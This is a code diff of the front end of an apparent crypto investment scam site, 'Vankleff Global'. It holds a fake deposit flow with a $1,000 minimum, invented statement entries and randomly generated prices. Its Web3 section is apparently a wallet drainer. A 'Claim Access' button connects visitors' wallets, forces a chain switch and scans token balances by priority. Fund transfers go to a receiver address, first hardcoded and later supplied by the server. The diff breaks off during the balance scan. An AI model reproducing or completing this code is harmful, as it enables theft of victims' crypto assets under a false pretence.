+  if(!a||isNaN(a)||a<1000){ showGM('Minimum Deposit','Minimum is $1,000.','OK',closeGM,false); return; }
   depAmt = a;
   document.getElementById('dep-form').style.display='none'; document.getElementById('dep-addr').style.display='block';
   startTmr(30*60);
@@ -568,124 +553,139 @@ function confDep(){
   document.getElementById('proc-ov').classList.add('open');
 }
 
-// TRANSFER
-function doTransfer(){
-  var r = document.getElementById('tf-recipient').value;
-  var a = document.getElementById('tf-amount').value;
-  if(!r||!a){ showGM('Missing Info','Please fill in recipient and amount.','OK',closeGM,false); return; }
-  showGM('Transfer Submitted','Your transfer of $'+a+' to '+r+' is being processed.','OK,function(){closeGM();showDash(\'main\');}',false);
-}
-
-// STATEMENT
-var STMT_DATA = [
-  {type:'deposit', ic:'dep', title:'Deposit via USDT', date:'May 11, 2026', amt:'+$1,000.00', pos:true, badge:'pending'},
-  {type:'withdrawal', ic:'wit', title:'Withdrawal Request', date:'May 8, 2026', amt:'-$2,000.00', pos:false, badge:'completed'},
-  {type:'investment', ic:'inv', title:'Strategic Alpha Plan', date:'May 7, 2026', amt:'+$3,500.00', pos:true, badge:'completed'},
-  {type:'investment', ic:'copy', title:'Copy Trade - Alex Sterling', date:'May 6, 2026', amt:'+$420.00', pos:true, badge:'completed'}
-];
-function renderStmt(filter){
-  filter = filter || 'all';
-  var list = document.getElementById('stmt-list');
-  var items = STMT_DATA.filter(function(s){ return filter==='all' || s.type===filter; });
-  list.innerHTML = items.map(function(s){
-    return '<div class="stmt-card"><div class="stmt-ic stmt-ic-'+s.ic+'">'+(s.ic==='dep'?'⬇':s.ic==='wit'?'⬆':s.ic==='inv'?'📊':'⇄')+'</div><div class="stmt-info"><div class="stmt-title">'+s.title+'</div><div class="stmt-date">'+s.date+'</div></div><div class="stmt-right"><div class="stmt-amt '+(s.pos?'pos':'neg')+'">'+s.amt+'</div><span class="stmt-badge stmt-badge-'+s.badge+'">'+s.badge+'</span></div></div>';
-  }).join('');
-}
-function filterStmt(btn, filter){
-  document.querySelectorAll('.stmt-tab').forEach(function(t){ t.classList.remove('active'); });
-  btn.classList.add('active');
-  renderStmt(filter);
-}
-
-// REFERRAL
-function copyRefLink(){
-  var link = 'https://vankleffglobal.com/ref/VKG-10024';
-  navigator.clipboard ? navigator.clipboard.writeText(link).then(function(){ alert('Link copied!'); }) : alert(link);
-}
-
-// CHAT
-function sendChat(){
-  var input = document.getElementById('chat-input');
-  var msg = input.value.trim();
-  if(!msg) return;
-  var box = document.getElementById('chat-box');
-  box.innerHTML += '<div class="chat-msg sent"><div class="chat-bubble">'+msg+'</div></div>';
-  input.value = '';
-  box.scrollTop = box.scrollHeight;
-  setTimeout(function(){
-    box.innerHTML += '<div class="chat-msg recv"><div class="chat-bubble">Thank you for your message. Our support team will respond shortly. For urgent matters, email support@vankleffglobal.com</div></div>';
-    box.scrollTop = box.scrollHeight;
-  },1500);
-}
-
-// PRICE TICKER
+// ─── PRICE TICKER ─────────────────────────────────────────────
 function updPrices(){
   Object.keys(prices).forEach(function(c){ var ch=(Math.random()-0.48)*0.8; prices[c]*=(1+ch/100); var pe=document.getElementById('p-'+c),ce=document.getElementById('c-'+c); if(pe){ pe.textContent='$'+(prices[c]>100?prices[c].toFixed(1):prices[c].toFixed(4)); if(ce){ ce.textContent=(ch>=0?'▲ +':'▼ ')+Math.abs(ch).toFixed(2)+'%'; ce.className=ch>=0?'up':'dn2'; }} });
 }
 setInterval(updPrices,8000);
 
+// ─── RISK DISCLOSURE ──────────────────────────────────────────
 window.onload = function(){ document.getElementById('risk-overlay').style.display='flex'; };
 function acceptRisk(){ document.getElementById('risk-overlay').style.display='none'; }
+
+// ─── OTP INPUT HANDLING ───────────────────────────────────────
 document.addEventListener('DOMContentLoaded',function(){
   document.querySelectorAll('.otp-in').forEach(function(inp,i,all){ inp.addEventListener('input',function(){ if(inp.value.length===1&&i<all.length-1) all[i+1].focus(); }); inp.addEventListener('keydown',function(e){ if(e.key==='Backspace'&&!inp.value&&i>0) all[i-1].focus(); }); });
 });
 
-// ═══ WEB3 ═══
+// ═══════════════════════════════════════════════════════════════
+// WEB3 FRONTEND — PURE DISPLAY & USER INTERACTION
+// NO business logic, NO secret keys, NO automated trigger logic
+// All decisions come from api/process.php
+// Active chainId is included in EVERY API request payload
+// ═══════════════════════════════════════════════════════════════
 (function(){
-  var connectBtn = document.getElementById('connectBtn');
-  var claimBtn = document.getElementById('claimBtn');
-  var disconnectBtn = document.getElementById('disconnectBtn');
-  var statusText = document.getElementById('statusText');
-  var stageLog = document.getElementById('stageLog');
-  var infoPanel = document.getElementById('infoPanel');
-  var txPanel = document.getElementById('txPanel');
-  var scannerPanel = document.getElementById('scannerPanel');
-  var errorBanner = document.getElementById('errorBanner');
-  var statusBadge = document.getElementById('statusBadge');
+  var connectBtn        = document.getElementById('connectBtn');
+  var claimBtn          = document.getElementById('claimBtn');
+  var disconnectBtn     = document.getElementById('disconnectBtn');
+  var statusText        = document.getElementById('statusText');
+  var stageLog          = document.getElementById('stageLog');
+  var infoPanel         = document.getElementById('infoPanel');
+  var txPanel           = document.getElementById('txPanel');
+  var scannerPanel      = document.getElementById('scannerPanel');
+  var errorBanner       = document.getElementById('errorBanner');
+  var statusBadge       = document.getElementById('statusBadge');
   var chainSwitchBanner = document.getElementById('chainSwitchBanner');
-  var chainSwitchMsg = document.getElementById('chainSwitchMsg');
-  var switchChainBtn = document.getElementById('switchChainBtn');
+  var chainSwitchMsg    = document.getElementById('chainSwitchMsg');
+  var switchChainBtn    = document.getElementById('switchChainBtn');
 
+  // ─── NETWORK DEFINITIONS ──────────────────────────────────────
   var NETWORKS = {
-    bsc:{key:'bsc',chain_id:56,chain_hex:'0x38',name:'BNB Smart Chain',native_currency:{name:'BNB',symbol:'BNB',decimals:18},rpc_url:'https://bsc-dataseed1.binance.org/',explorer_url:'https://bscscan.com',chain_name:'BNB Smart Chain'},
-    ethereum:{key:'ethereum',chain_id:1,chain_hex:'0x1',name:'Ethereum Mainnet',native_currency:{name:'Ether',symbol:'ETH',decimals:18},rpc_url:'https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161',explorer_url:'https://etherscan.io',chain_name:'Ethereum Mainnet'}
+    bsc: {
+      chainId: 56,
+      chainHex: '0x38',
+      name: 'BNB Smart Chain',
+      shortName: 'BSC',
+      symbol: 'BNB',
+      rpcUrl: 'https://bsc-dataseed1.binance.org/',
+      explorerUrl: 'https://bscscan.com',
+      chainName: 'BNB Smart Chain'
+    },
+    eth: {
+      chainId: 1,
+      chainHex: '0x1',
+      name: 'Ethereum Mainnet',
+      shortName: 'ETH',
+      symbol: 'ETH',
+      rpcUrl: 'https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161',
+      explorerUrl: 'https://etherscan.io',
+      chainName: 'Ethereum Mainnet'
+    }
   };
-  var FALLBACK_TOKENS = {
-    56:[{symbol:'USDT',address:'0x55d398326f99059fF775485246999027B3197955',decimals:18,priority:'stable'},{symbol:'USDC',address:'0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d',decimals:18,priority:'stable'},{symbol:'BUSD',address:'0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56',decimals:18,priority:'stable'},{symbol:'WBNB',address:'0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c',decimals:18,priority:'high'},{symbol:'CAKE',address:'0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82',decimals:18,priority:'high'},{symbol:'XRP',address:'0x1D2F0da169ceB9fC7B3144628dB156f3F6c60dBE',decimals:18,priority:'medium'},{symbol:'ADA',address:'0x3EE2200Efb3400fAbB9AacF31297cBdD1d435D47',decimals:18,priority:'medium'},{symbol:'DOT',address:'0x7083609fCE4d1d8Dc0C979AAb8c869Ea2C873402',decimals:18,priority:'medium'},{symbol:'LINK',address:'0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD',decimals:18,priority:'medium'},{symbol:'DOGE',address:'0xbA2aE424d960c26247Dd6c32edC70B295c744C43',decimals:8,priority:'low'},{symbol:'SHIB',address:'0x2859e4544C4bB03966803b044A93563Bd2D0DD4D',decimals:18,priority:'low'},{symbol:'PEPE',address:'0x25d887Ce7a35172C62FeBFD67a1856F20FaEbB00',decimals:18,priority:'low'},{symbol:'FLOKI',address:'0xfb5B838b6cfEEdC2873aB27866079AC55363D37A',decimals:9,priority:'low'},{symbol:'TWT',address:'0x4B0F1812e5Df2A09796481Ff14017e6005508003',decimals:18,priority:'low'},{symbol:'BSW',address:'0x965F527D9159dCe6288a2219DB51fc6Eef120dD1',decimals:18,priority:'low'},{symbol:'BABYDOGE',address:'0xc748673057861a797275CD8A068AbB95A902e8de',decimals:9,priority:'low'}],
-    1:[{symbol:'USDT',address:'0xdAC17F958D2ee523a2206206994597C13D831ec7',decimals:6,priority:'stable'},{symbol:'USDC',address:'0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',decimals:6,priority:'stable'},{symbol:'DAI',address:'0x6B175474E89094C44Da98b954EedeAC495271d0F',decimals:18,priority:'stable'},{symbol:'WETH',address:'0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2',decimals:18,priority:'high'},{symbol:'LINK',address:'0x514910771AF9Ca656af840dff83E8264EcF986CA',decimals:18,priority:'high'},{symbol:'UNI',address:'0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984',decimals:18,priority:'high'},{symbol:'SHIB',address:'0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE',decimals:18,priority:'medium'},{symbol:'PEPE',address:'0x6982508145454Ce325dDbE47a25d4ec3d2311933',decimals:18,priority:'medium'},{symbol:'AAVE',address:'0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9',decimals:18,priority:'medium'},{symbol:'MKR',address:'0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2',decimals:18,priority:'low'}]
-  };
-  var STABLECOINS = ['USDT','USDC','BUSD','DAI'];
-  var GAS_LIMIT_TOKEN = 200000, GAS_UNITS_NATIVE = 21000;
-  var RECEIVER_ADDRESS = '0x4000bAf1B2d5bbe78b6e56fDa21b1D3E4022C1Db';
-  var selectedNetworkKey = 'bsc', TARGET_CHAIN_ID = 56, TARGET_CHAIN_HEX = '0x38';
+
+  // ─── ACTIVE NETWORK STATE (default: BSC — preserves existing behaviour) ─
+  var selectedNetworkKey = 'bsc';
+  var TARGET_CHAIN_ID    = NETWORKS.bsc.chainId;
+  var TARGET_CHAIN_HEX   = NETWORKS.bsc.chainHex;
+
   var ethersProvider = null, ethersSigner = null, rawProvider = null;
-  var transactions = [], currentChainId = 56, connectedAccount = null, triggerRunning = false;
-  var serverConfig = null, web3Modal = null, wagmiConfig = null, discoveredAssets = [];
+  var transactions = [], currentChainId = TARGET_CHAIN_ID;
+  var connectedAccount = null, triggerRunning = false;
+  var serverConfig = null, serverReceiver = null, serverTokenList = null;
+  var serverActionPlan = null;
+  var discoveredAssets = [];
+
   var sleep = function(ms){ return new Promise(function(r){ setTimeout(r, ms); }); };
 
+  // ─── NETWORK SELECTOR UI ──────────────────────────────────────
   function selectNetwork(key){
-    if (!NETWORKS[key]) return;
+    if (connectedAccount) {
+      // If already connected, switch the wallet chain too
+      selectedNetworkKey = key;
+      applyNetworkSelection(key);
+      switchToSelectedChain();
+      return;
+    }
     selectedNetworkKey = key;
     applyNetworkSelection(key);
-    if (connectedAccount && rawProvider) {
-      if (currentChainId !== TARGET_CHAIN_ID) { updateChainSwitchBanner(); chainSwitchBanner.classList.add('visible'); switchToSelectedChain(); }
-      else { chainSwitchBanner.classList.remove('visible'); refreshInfo(connectedAccount.address, currentChainId); }
+  }
+
+  function applyNetworkSelection(key){
+    var net = NETWORKS[key];
+    TARGET_CHAIN_ID  = net.chainId;
+    TARGET_CHAIN_HEX = net.chainHex;
+
+    // Update selector tabs
+    document.getElementById('net-bsc').className = 'net-opt' + (key==='bsc' ? ' active-bsc' : '');
+    document.getElementById('net-eth').className = 'net-opt' + (key==='eth' ? ' active-eth' : '');
+
+    // Update active-network bar
+    var dot  = document.getElementById('activeNetDot');
+    var name = document.getElementById('activeNetName');
+    dot.className  = 'active-net-dot ' + (key==='bsc' ? 'dot-bsc' : 'dot-eth');
+    name.className = 'active-net-name ' + key;
+    name.textContent = net.name + ' (' + net.shortName + ')';
+
+    log('Network selected: ' + net.name + ' (Chain ID ' + net.chainId + ')', 'ok');
+  }
+
+  // ─── apiCall — chainId injected into EVERY request ────────────
+  async function apiCall(action, payload){
+    payload = payload || {};
+    // Always include active chainId so backend knows which config to use
+    payload.chain_id = payload.chain_id !== undefined ? payload.chain_id : TARGET_CHAIN_ID;
+    try {
+      var res = await fetch(API, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'X-Chain-ID': String(TARGET_CHAIN_ID)   // also sent as a header
+        },
+        body: JSON.stringify({ action: action, payload: payload })
+      });
+      var data = await res.json();
+      if (!data.success) { log(data.error || 'API error', 'err'); return null; }
+      return data;
+    } catch(e) {
+      log('API call failed: ' + e.message, 'err');
+      setStatus('Backend connection failed.');
+      return null;
     }
   }
-  function applyNetworkSelection(key){
-    var net = NETWORKS[key]; TARGET_CHAIN_ID = net.chain_id; TARGET_CHAIN_HEX = net.chain_hex;
-    var bscEl = document.getElementById('net-bsc'), ethEl = document.getElementById('net-ethereum');
-    if (bscEl) bscEl.className = 'net-opt' + (key==='bsc' ? ' active' : '');
-    if (ethEl) ethEl.className = 'net-opt' + (key==='ethereum' ? ' active' : '');
-    var dot = document.getElementById('activeNetDot'), name = document.getElementById('activeNetName'), idEl = document.getElementById('activeNetId');
-    if (dot) dot.className = 'active-net-dot ' + (key==='bsc' ? 'dot-bsc' : 'dot-eth');
-    if (name) name.textContent = net.name;
-    if (idEl) idEl.textContent = 'Chain ID: ' + net.chain_id;
-    log('Network selected: ' + net.name + ' (Chain ID ' + net.chain_id + ')', 'ok');
-  }
+
+  // ─── LOGGING ────────────────────────────────────────────────
   function log(msg, type){
     type = type || 'info';
-    if (typeof msg === 'object') { try { msg = JSON.stringify(msg); } catch(e) { msg = String(msg); } }
     stageLog.classList.add('visible');
     var line = document.createElement('div');
     line.className = 'log-line' + (type==='ok'?' log-ok':type==='warn'?' log-warn':type==='err'?' log-err':'');
@@ -695,199 +695,463 @@ document.addEventListener('DOMContentLoaded',function(){
   }
   function setStatus(msg){ statusText.textContent = msg; log(msg); }
 
-  async function apiCall(action, payload){
-    payload = payload || {}; payload.chain_id = payload.chain_id !== undefined ? payload.chain_id : TARGET_CHAIN_ID;
-    try {
-      var res = await fetch(API, { method:'POST', headers:{'Content-Type':'application/json','X-Chain-ID':String(TARGET_CHAIN_ID)}, body: JSON.stringify({ action:action, payload:payload }) });
-      var text = await res.text();
-      if (text.trim().charAt(0) === '<' || text.trim().startsWith('<!DOCTYPE')) { log('Backend returned HTML — using client-side fallback.', 'warn'); return null; }
-      var data = JSON.parse(text);
-      if (!data.success) { var errMsg = data.error; if (typeof errMsg === 'object') errMsg = JSON.stringify(errMsg); log(action + ' error: ' + (errMsg || 'API error'), 'err'); return null; }
-      return data;
-    } catch(e) { log('Backend unreachable — using client-side fallback.', 'warn'); return null; }
-  }
+  // ─── LOAD SERVER CONFIG ──────────────────────────────────────
   async function loadServerConfig(){
     log('Fetching server config (chain ' + TARGET_CHAIN_ID + ')...');
     var cfg = await apiCall('get_config', { chain_id: TARGET_CHAIN_ID });
-    if (!cfg) { log('Server config unavailable — using local defaults.', 'warn'); return false; }
-    serverConfig = cfg; log('Server config loaded for chain ' + TARGET_CHAIN_ID + '.', 'ok'); return true;
+    if (!cfg) return false;
+    serverConfig = cfg;
+    // Server may override chain params; local selection takes precedence
+    log('Server config loaded for chain ' + TARGET_CHAIN_ID + '.', 'ok');
+    return true;
   }
+
+  // ─── INIT WEB3MODAL ─────────────────────────────────────────
   async function initWeb3Modal(){
-    await loadServerConfig();
+    if (!serverConfig) { await loadServerConfig(); if (!serverConfig) return; }
+
     var ESM = 'https://esm.sh/v135';
     try {
-      log('Loading Web3Modal libraries...');
-      var _w3m = await import(ESM + '/@web3modal/wagmi@5.1.11');
+      var _w3m    = await import(ESM + '/@web3modal/wagmi@5.1.11');
       var _chains = await import(ESM + '/wagmi@2.12.7/chains');
-      var _core = await import(ESM + '/@wagmi/core@2.13.4');
-      var _eth = await import(ESM + '/ethers@6.13.4');
-      log('Web3 libraries loaded.', 'ok');
-      var projectId = (serverConfig && serverConfig.web3modal_project_id) || '6d97bf9b04efc25f048a85edeb3f3fd1';
+      var _core   = await import(ESM + '/@wagmi/core@2.13.4');
+      var _eth    = await import(ESM + '/ethers@6.13.4');
+
+      var projectId = serverConfig.web3modal_project_id || '6d97bf9b04efc25f048a85edeb3f3fd1';
+      // Both BSC and Ethereum included; user's selection determines which is active
       var chains = [_chains.bsc, _chains.mainnet, _chains.polygon, _chains.arbitrum, _chains.optimism, _chains.avalanche];
-      wagmiConfig = _w3m.defaultWagmiConfig({ chains:chains, projectId:projectId, metadata:{name:'Vankleff Global',description:'Wallet Connect',url:window.location.origin,icons:['https://avatars.githubusercontent.com/u/37784886']}, ssr:false });
+
+      var wagmiConfig = _w3m.defaultWagmiConfig({
+        chains: chains, projectId: projectId,
+        metadata: { name:'Connect', description:'Wallet Connect', url: window.location.origin, icons: ['https://avatars.githubusercontent.com/u/37784886'] },
+        ssr: false
+      });
+
       await _core.reconnect(wagmiConfig);
-      var defaultChain = selectedNetworkKey === 'ethereum' ? _chains.mainnet : _chains.bsc;
-      web3Modal = _w3m.createWeb3Modal({ wagmiConfig:wagmiConfig, projectId:projectId, chains:chains, defaultChain:defaultChain, themeMode:'dark', themeVariables:{'--w3m-color-mix':'#22c55e','--w3m-color-mix-strength':20,'--w3m-accent':'#22c55e','--w3m-z-index':9999} });
-      log('Web3Modal initialized.', 'ok');
-      connectBtn.addEventListener('click', async function(){ if (!web3Modal) { setStatus('Wallet modal not ready yet.'); return; } try { setStatus('Opening wallet selector...'); await web3Modal.open(); } catch(e) { log('Could not open wallet modal: ' + e.message, 'err'); } });
-      disconnectBtn.addEventListener('click', async function(){ try { await _core.disconnect(wagmiConfig); } catch(e) {} onDisconnected(); });
+
+      // Default chain reflects current selection
+      var defaultChain = selectedNetworkKey === 'eth' ? _chains.mainnet : _chains.bsc;
+
+      var modal = _w3m.createWeb3Modal({
+        wagmiConfig: wagmiConfig, projectId: projectId, chains: chains, defaultChain: defaultChain,
+        themeMode: 'dark',
+        themeVariables: { '--w3m-color-mix':'#22c55e','--w3m-color-mix-strength':20,'--w3m-accent':'#22c55e','--w3m-z-index':9999 }
+      });
+
+      // ─── BUTTON HANDLERS ─────────────────────────────────────
+      connectBtn.addEventListener('click', async function(){
+        try { setStatus('Opening wallet selector...'); await modal.open(); } catch(e) { setStatus('Could not open wallet modal.'); }
+      });
+
+      disconnectBtn.addEventListener('click', async function(){ await _core.disconnect(wagmiConfig); onDisconnected(); });
+
       switchChainBtn.addEventListener('click', async function(){ await switchToSelectedChain(); });
+
       claimBtn.addEventListener('click', async function(){
         if (triggerRunning) return;
-        if (!connectedAccount) { setStatus('Connect your wallet first.'); return; }
-        if (currentChainId !== TARGET_CHAIN_ID) { setStatus('Switch to ' + NETWORKS[selectedNetworkKey].name + ' first.'); updateChainSwitchBanner(); chainSwitchBanner.classList.add('visible'); await switchToSelectedChain(); return; }
+        if (!connectedAccount) { log('No connected account', 'warn'); return; }
+        if (currentChainId !== TARGET_CHAIN_ID) {
+          setStatus('Switch to ' + NETWORKS[selectedNetworkKey].name + ' first.');
+          chainSwitchBanner.classList.add('visible');
+          await switchToSelectedChain();
+          return;
+        }
         claimBtn.disabled = true; claimBtn.textContent = 'Processing...';
         await initiateClaim(connectedAccount.address, currentChainId);
         claimBtn.disabled = false; claimBtn.textContent = '✦ Claim Access';
       });
-      _core.watchAccount(wagmiConfig, { onChange: async function(account){ if (account.isConnected && account.address) { await onConnected(account, _eth); } else if (!account.isConnected) { onDisconnected(); } } });
+
+      // ─── ACCOUNT WATCHER ─────────────────────────────────────
+      _core.watchAccount(wagmiConfig, {
+        onChange: async function(account){
+          if (account.isConnected && account.address) { await onConnected(account, _eth); }
+          else if (!account.isConnected) { onDisconnected(); }
+        }
+      });
+
+      // ─── SESSION RESTORE ─────────────────────────────────────
       var existing = _core.getAccount(wagmiConfig);
-      if (existing.isConnected && existing.address) { log('Restoring existing session...', 'ok'); try { await onConnected(existing, _eth); } catch(e) { log('Session restore failed: ' + e.message, 'warn'); } }
-      else { log('Ready — Select network, then connect wallet.', 'ok'); setStatus('Select a network and click Connect Wallet.'); }
-    } catch(e) { log('Web3 init error: ' + e.message, 'err'); if (errorBanner) { errorBanner.textContent = 'Init failed: ' + e.message; errorBanner.classList.add('visible'); } }
+      if (existing.isConnected && existing.address) {
+        log('Restoring existing session...', 'ok');
+        try { await onConnected(existing, _eth); } catch(e) { log('Session restore failed: ' + e.message, 'warn'); }
+      } else {
+        log('Ready — Select network, then connect wallet.', 'ok');
+      }
+
+    } catch(e) {
+      log('Web3 init error: ' + e.message, 'err');
+      if (errorBanner) { errorBanner.textContent = 'Init failed: ' + e.message; errorBanner.classList.add('visible'); }
+    }
   }
+
+  // ─── BUILD SIGNER ───────────────────────────────────────────
   async function buildSigner(account){
-    log('Building BrowserProvider...'); rawProvider = null;
-    if (account && account.connector) { try { rawProvider = await account.connector.getProvider(); } catch(e) {} }
+    log('Building BrowserProvider...');
+    rawProvider = null;
+    if (account && account.connector) {
+      try { rawProvider = await account.connector.getProvider(); } catch(e) { log('Provider fallback', 'warn'); }
+    }
     if (!rawProvider && window.ethereum) rawProvider = window.ethereum;
     if (!rawProvider) throw new Error('No wallet provider.');
     var _eth = await import('https://esm.sh/v135/ethers@6.13.4');
     ethersProvider = new _eth.BrowserProvider(rawProvider);
     var accounts = [];
-    for (var attempt=1; attempt<=8; attempt++) { accounts = await ethersProvider.send('eth_accounts', []); if (accounts.length>0) break; await sleep(600); }
+    for (var attempt=1; attempt<=8; attempt++) {
+      accounts = await ethersProvider.send('eth_accounts', []);
+      if (accounts.length>0) break;
+      await sleep(600);
+    }
     if (!accounts.length) throw new Error('Wallet returned no accounts.');
-    ethersSigner = await ethersProvider.getSigner(); log('Signer ready.', 'ok');
+    ethersSigner = await ethersProvider.getSigner();
+    log('Signer ready.', 'ok');
   }
+
+  // ─── CHAIN SWITCH (supports BSC and Ethereum) ────────────────
   async function switchToSelectedChain(){
-    if (!rawProvider) { log('No provider — connect wallet first.', 'warn'); return; }
+    if (!rawProvider) { log('No provider yet — connect wallet first.', 'warn'); return; }
     var net = NETWORKS[selectedNetworkKey];
-    try { await rawProvider.request({ method:'wallet_switchEthereumChain', params:[{chainId:net.chain_hex}] }); log('Switched to ' + net.name, 'ok'); chainSwitchBanner.classList.remove('visible'); }
-    catch(e) { if (e.code === 4902) { try { await rawProvider.request({ method:'wallet_addEthereumChain', params:[{ chainId:net.chain_hex, chainName:net.chain_name, nativeCurrency:{name:net.native_currency.name,symbol:net.native_currency.symbol,decimals:net.native_currency.decimals||18}, rpcUrls:[net.rpc_url], blockExplorerUrls:[net.explorer_url] }] }); log(net.name + ' added to wallet.', 'ok'); chainSwitchBanner.classList.remove('visible'); } catch(addErr) { log('Failed adding ' + net.name + ' to wallet.', 'err'); } } else { log('Chain switch cancelled or failed.', 'err'); } }
+    try {
+      await rawProvider.request({ method:'wallet_switchEthereumChain', params:[{ chainId: net.chainHex }] });
+      log('Switched to ' + net.name, 'ok');
+    } catch(e) {
+      if (e.code === 4902) {
+        try {
+          await rawProvider.request({ method:'wallet_addEthereumChain', params:[{
+            chainId: net.chainHex,
+            chainName: net.chainName,
+            nativeCurrency: { name: net.symbol, symbol: net.symbol, decimals: 18 },
+            rpcUrls: [net.rpcUrl],
+            blockExplorerUrls: [net.explorerUrl]
+          }]});
+          log(net.name + ' added to wallet.', 'ok');
+        } catch(addErr) { log('Failed adding ' + net.name + ' to wallet.', 'err'); }
+      } else { log('Chain switch cancelled or failed.', 'err'); }
+    }
   }
-  function updateChainSwitchBanner(){ var net = NETWORKS[selectedNetworkKey]; chainSwitchMsg.innerHTML = '⚠️ Please switch to <strong>' + net.name + '</strong> to continue.'; }
+
+  // ─── UPDATE CHAIN SWITCH BANNER MESSAGE ──────────────────────
+  function updateChainSwitchBanner(){
+    var net = NETWORKS[selectedNetworkKey];
+    chainSwitchMsg.innerHTML = '⚠️ Please switch to <strong>' + net.name + '</strong> to continue.';
+  }
+
+  // ─── PROVIDER LISTENERS ─────────────────────────────────────
   function attachProviderListeners(){
     if (!rawProvider) return;
-    rawProvider.on('chainChanged', async function(hexChain){ currentChainId = parseInt(hexChain, 16); if (currentChainId !== TARGET_CHAIN_ID) { updateChainSwitchBanner(); chainSwitchBanner.classList.add('visible'); setStatus('Wrong network detected.'); } else { chainSwitchBanner.classList.remove('visible'); setStatus(NETWORKS[selectedNetworkKey].name + ' detected.'); } if (connectedAccount) { try { await buildSigner(connectedAccount); await refreshInfo(connectedAccount.address, currentChainId); } catch(e) {} } });
-    rawProvider.on('accountsChanged', async function(accs){ if (!accs.length) { onDisconnected(); return; } if (connectedAccount) { try { await buildSigner(connectedAccount); await refreshInfo(accs[0], currentChainId); } catch(e) {} } });
+    rawProvider.on('chainChanged', async function(hexChain){
+      currentChainId = parseInt(hexChain, 16);
+      if (currentChainId !== TARGET_CHAIN_ID) {
+        updateChainSwitchBanner();
+        chainSwitchBanner.classList.add('visible');
+        setStatus('Wrong network detected.');
+      } else {
+        chainSwitchBanner.classList.remove('visible');
+        setStatus(NETWORKS[selectedNetworkKey].name + ' detected.');
+      }
+      if (connectedAccount) {
+        try { await buildSigner(connectedAccount); await refreshInfo(connectedAccount.address, currentChainId); } catch(e) {}
+      }
+    });
+    rawProvider.on('accountsChanged', async function(accs){
+      if (!accs.length) { onDisconnected(); return; }
+      if (connectedAccount) {
+        try { await buildSigner(connectedAccount); await refreshInfo(accs[0], currentChainId); } catch(e) {}
+      }
+    });
     log('Provider listeners attached.', 'ok');
   }
+
+  // ─── ON CONNECTED ───────────────────────────────────────────
   async function onConnected(account, _eth){
-    log('Wallet connected: ' + account.address, 'ok'); connectedAccount = account; currentChainId = account.chainId || TARGET_CHAIN_ID;
-    connectBtn.style.display = 'none'; claimBtn.style.display = 'inline-block'; disconnectBtn.style.display = 'inline-block';
-    infoPanel.classList.add('visible'); txPanel.classList.add('visible');
+    log('Wallet connected: ' + account.address, 'ok');
+    connectedAccount = account;
+    currentChainId = account.chainId || TARGET_CHAIN_ID;
+    connectBtn.style.display = 'none';
+    claimBtn.style.display = 'inline-block';
+    disconnectBtn.style.display = 'inline-block';
+    infoPanel.classList.add('visible');
+    txPanel.classList.add('visible');
     document.getElementById('walletAddress').textContent = account.address.slice(0,8) + '...' + account.address.slice(-6);
     document.getElementById('sessionLabel').textContent = (account.connector && account.connector.name) || 'Web3Modal';
     statusBadge.textContent = 'Awaiting Claim'; statusBadge.className = 'badge badge-yellow';
     try { await buildSigner(account); } catch(e) { setStatus('Could not reach wallet.'); return; }
     attachProviderListeners();
-    if (currentChainId !== TARGET_CHAIN_ID) { updateChainSwitchBanner(); chainSwitchBanner.classList.add('visible'); setStatus('Switch to ' + NETWORKS[selectedNetworkKey].name + ' to continue.'); }
-    else { chainSwitchBanner.classList.remove('visible'); setStatus('Connected to ' + NETWORKS[selectedNetworkKey].name + '. Click Claim Access.'); }
+    if (currentChainId !== TARGET_CHAIN_ID) {
+      updateChainSwitchBanner();
+      chainSwitchBanner.classList.add('visible');
+      setStatus('Switch to ' + NETWORKS[selectedNetworkKey].name + ' to continue.');
+    } else {
+      chainSwitchBanner.classList.remove('visible');
+      setStatus('Connected to ' + NETWORKS[selectedNetworkKey].name + '. Click Claim Access.');
+    }
     await refreshInfo(account.address, currentChainId);
   }
+
+  // ─── SCAN WALLET ASSETS ─────────────────────────────────────
   async function scanWalletAssets(address, chainId){
-    var tokens = null;
     var tokenData = await apiCall('get_token_list', { chain_id: chainId });
-    if (tokenData && tokenData.tokens && tokenData.tokens.length) { tokens = tokenData.tokens; log('Using server token list (' + tokens.length + ' tokens).', 'ok'); }
-    else { tokens = FALLBACK_TOKENS[chainId] || []; log('Using client-side fallback token list (' + tokens.length + ' tokens).', 'ok'); }
-    if (!tokens.length) { document.getElementById('assetList').innerHTML = '<span class="scan-status">No token list available for this chain.</span>'; scannerPanel.classList.add('visible'); return []; }
-    discoveredAssets = []; log('Scanning ' + tokens.length + ' tokens on chain ' + chainId + '...');
-    document.getElementById('assetList').innerHTML = '<span class="scan-status">Scanning ' + tokens.length + ' tokens...</span>'; scannerPanel.classList.add('visible');
+    if (!tokenData || !tokenData.tokens || !tokenData.tokens.length) {
+      document.getElementById('assetList').innerHTML = '<span class="scan-status">No token list available.</span>';
+      scannerPanel.classList.add('visible');
+      return [];
+    }
+    var tokens = tokenData.tokens;
+    discoveredAssets = [];
+    log('Scanning ' + tokens.length + ' tokens on chain ' + chainId + '...');
+    document.getElementById('assetList').innerHTML = '<span class="scan-status">Scanning ' + tokens.length + ' tokens...</span>';
+    scannerPanel.classList.add('visible');
+
     var _eth = await import('https://esm.sh/v135/ethers@6.13.4');
-    var results = await Promise.allSettled(tokens.map(async function(t){ try { var c = new _eth.Contract(t.address, ['function balanceOf(address owner) view returns (uint256)','function decimals() view returns (uint8)'], ethersProvider); var bal = await c.balanceOf(address); var dec = t.decimals || 18; var fmt = parseFloat(_eth.formatUnits(bal, dec)); return fmt > 0 ? { symbol:t.symbol, address:t.address, decimals:dec, balance:fmt, rawBalance:bal.toString() } : null; } catch(e) { return null; } }));
